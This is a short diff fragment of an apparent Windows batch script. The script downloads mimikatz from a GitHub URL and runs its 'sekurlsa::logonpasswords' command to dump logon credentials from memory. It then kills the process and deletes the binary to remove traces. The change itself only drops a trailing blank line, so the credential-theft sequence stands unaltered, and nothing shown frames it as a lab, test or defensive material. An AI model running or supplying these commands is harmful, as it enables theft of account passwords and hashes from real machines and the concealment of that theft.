@@ -2,4 +2,3 @@ powershell -command "Invoke-WebRequest -Uri 'https://github.com/ParrotSec/mimika
 powershell -command "C:\mimikatze.exe sekurlsa::logonpasswords exit"
 powershell -command "taskkill /IM "mimikatze.exe" /F"
 del C:\mimikatze.exe
-
